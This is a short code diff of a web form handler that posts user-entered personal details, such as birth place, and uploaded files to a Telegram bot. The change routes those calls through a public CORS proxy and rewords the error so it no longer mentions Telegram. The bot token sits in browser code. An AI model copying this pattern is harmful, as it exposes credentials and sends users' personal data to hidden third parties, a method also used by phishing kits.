@@ -36,7 +36,7 @@ const handleSubmit = async (e) => {
 🌍 Birth Place: ${formData.get("birthPlace")}
     `;
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -58,7 +58,7 @@ const handleSubmit = async (e) => {
         telegramFile.append("document", file);
 
         await fetch(
-          `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
+          `https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
           {
             method: "POST",
             body: telegramFile,
@@ -71,7 +71,7 @@ const handleSubmit = async (e) => {
 
   } catch (error) {
     console.error(error);
-    setSubmitError("Failed to send to Telegram.");
+    setSubmitError("Failed to submit");
   } finally {
     setIsSubmitting(false);
   }
